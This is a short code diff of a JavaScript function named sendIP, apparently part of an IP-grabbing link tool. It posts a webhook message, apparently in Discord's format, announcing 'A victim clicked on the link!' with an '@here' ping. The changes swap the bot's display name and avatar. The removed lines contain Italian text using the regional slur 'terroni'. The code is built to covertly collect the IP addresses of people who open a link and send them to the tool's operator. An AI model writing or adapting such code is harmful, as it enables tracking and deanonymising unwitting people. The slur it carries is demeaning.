@@ -13,9 +13,9 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "Cattura Terroni", // optionally changeable
-                            avatar_url: "https://i0.wp.com/css-tricks.com/wp-content/uploads/2021/09/download.jpg", // optionally changeable
-                            content: `Terrore Ammazato Capo @here`,
+                            username: "site logger <3", // optionally changeable
+                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
+                            content: `@here`,
                             embeds: [
                                 {
                                     title: 'A victim clicked on the link!',
